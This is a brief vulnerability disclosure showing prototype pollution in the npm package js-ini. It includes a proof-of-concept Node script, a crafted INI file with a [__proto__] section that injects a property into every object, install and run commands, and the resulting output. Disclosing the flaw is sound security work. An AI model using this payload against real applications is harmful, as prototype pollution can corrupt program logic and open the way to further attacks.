# Description

`js-ini` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC and INI files:

```
// poc.js
var fs = require('fs')
var ini = require('js-ini')
console.log("Before : " + {}.polluted);
var parsed = ini.parse(fs.readFileSync('./payload.ini', 'utf-8'))
console.log("After : " + {}.polluted);

//payload.ini
[__proto__]
polluted = "Yes! Its Polluted"
```


2. Execute the following commands in terminal:

```
npm i js-ini # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : "Yes! Its Polluted"
```
